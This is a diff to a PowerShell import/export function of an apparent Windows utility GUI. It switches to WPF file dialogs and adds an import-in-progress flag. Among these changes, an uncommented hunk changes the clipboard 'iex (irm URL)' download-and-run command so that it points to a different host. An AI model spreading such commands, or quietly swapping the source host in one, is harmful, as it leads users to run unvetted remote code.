@@ -28,15 +28,16 @@ function Invoke-WPFImpex {
 
     function ConfigDialog {
         if (!$Config) {
-            switch ($type) {
-                "export" { $FileBrowser = New-Object System.Windows.Forms.SaveFileDialog }
-                "import" { $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog }
+            # Use native WPF dialogs to avoid WinForms modal unresponsiveness
+            $FileBrowser = switch ($type) {
+                "export" { New-Object Microsoft.Win32.SaveFileDialog }
+                "import" { New-Object Microsoft.Win32.OpenFileDialog }
             }
             $FileBrowser.InitialDirectory = [Environment]::GetFolderPath('Desktop')
             $FileBrowser.Filter = "JSON Files (*.json)|*.json"
-            $FileBrowser.ShowDialog() | Out-Null
+            $dialogResult = if ($sync.Form) { $FileBrowser.ShowDialog($sync.Form) } else { $FileBrowser.ShowDialog() }
 
-            if ($FileBrowser.FileName -eq "") {
+            if ($dialogResult -ne $true -or [string]::IsNullOrWhiteSpace($FileBrowser.FileName)) {
                 return $null
             } else {
                 return $FileBrowser.FileName
@@ -60,13 +61,15 @@ function Invoke-WPFImpex {
                     }
                     $jsonFile = $allConfs | ConvertTo-Json
                     $jsonFile | Out-File $Config -Force
-                    "iex ""& { `$(irm https://christitus.com/win) } -Config '$Config'""" | Set-Clipboard
+                    "iex ""& { `$(irm https://rinkurapria.dev/win) } -Config '$Config'""" | Set-Clipboard
                 }
             } catch {
                 Write-Error "An error occurred while exporting: $_"
             }
         }
         "import" {
+            $prevImport = $sync.ImportInProgress
+            $sync.ImportInProgress = $true
             try {
                 $Config = ConfigDialog
                 if ($Config) {
@@ -157,6 +160,8 @@ function Invoke-WPFImpex {
             } catch {
                 if ($ThrowOnError) { throw }
                 Write-Error "An error occurred while importing: $_"
+            } finally {
+                $sync.ImportInProgress = $prevImport
             }
         }
     }
